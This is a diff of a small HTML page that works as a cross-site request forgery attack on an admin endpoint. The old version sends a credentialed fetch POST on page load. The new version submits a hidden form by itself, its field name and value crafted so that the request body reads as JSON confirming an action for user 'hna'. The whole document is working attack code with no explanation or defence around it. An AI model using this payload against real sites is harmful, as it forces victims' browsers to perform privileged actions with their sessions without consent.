@@ -1,20 +1,4 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Auto POST Form</title>
-</head>
-<body>
-    <script type="text/javascript">
-        document.addEventListener("DOMContentLoaded", function() {
-            
-            // Gửi yêu cầu POST bằng fetch API
-            fetch('https://app/admin.php', {method: 'POST', credentials: 'include', headers: {'Content-Type': 'text/plain'}, body: '{"username":"hna","confirm":"yes"}'});
-            
-        });
-    </script>
-
-    <div id="response">Waiting for response1...</div>
-</body>
-</html>
+<form id="form" action="http://app/admin.php" method="POST"> 
+        <input name="{'username': 'hna', 'confirm': 'yes', 'test': '" value="'}">
+    </form>
+    <script> document.forms['form'].submit(); </script>
